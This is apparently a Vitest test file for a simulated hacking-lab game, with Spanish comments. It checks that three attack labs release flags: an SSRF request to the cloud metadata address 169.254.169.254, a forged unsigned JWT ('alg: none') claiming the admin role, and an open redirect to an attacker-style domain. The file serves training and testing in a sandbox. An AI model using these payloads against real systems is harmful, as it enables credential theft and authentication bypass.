import { describe, expect, it } from "vitest";
import { VirtualKernel } from "../VirtualKernel";
import { resetStorage, seedRandom } from "../../test/setup";

describe("labs de ataque (tanda 2)", () => {
  it("SSRF: apuntar a la metadata interna suelta credenciales", () => {
    resetStorage(); seedRandom();
    const k = new VirtualKernel();
    const host = "preview.vortex.nande";
    expect(k.browser.isWebApp(host)).toBe(true);
    const res = k.browser.request(
      "GET", host,
      "/fetch?url=" + encodeURIComponent("http://169.254.169.254/latest/meta-data/"),
    );
    expect(res.response.body).toContain("ND{ssrf_metadata_robada}");
    // Un sitio externo normal NO revela secretos.
    const ext = k.browser.request("GET", host, "/fetch?url=" + encodeURIComponent("http://ejemplo.com"));
    expect(ext.response.body).not.toContain("ND{");
  });

  it("JWT alg:none: un token sin firma con rol admin entra al panel", () => {
    resetStorage(); seedRandom();
    const k = new VirtualKernel();
    const host = "api.vortex.nande";
    // Token forjado: alg none, rol admin, firma vacía.
    const b64 = (o: object) =>
      btoa(JSON.stringify(o)).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
    const token = `${b64({ alg: "none", typ: "JWT" })}.${b64({ usuario: "admin", rol: "admin" })}.`;
    const res = k.browser.request("GET", host, "/panel?token=" + encodeURIComponent(token));
    expect(res.response.body).toContain("ND{jwt_alg_none}");
    // Un token de usuario normal NO entra al panel admin.
    const userTok = `${b64({ alg: "none" })}.${b64({ rol: "user" })}.`;
    const denied = k.browser.request("GET", host, "/panel?token=" + encodeURIComponent(userTok));
    expect(denied.response.body).not.toContain("ND{jwt_alg_none}");
  });

  it("Open redirect: un destino externo dispara la bandera", () => {
    resetStorage(); seedRandom();
    const k = new VirtualKernel();
    const host = "link.gulu.nande";
    const res = k.browser.request("GET", host, "/go?next=" + encodeURIComponent("http://sitio-atacante.evil"));
    expect(res.response.body).toContain("ND{open_redirect}");
  });
});
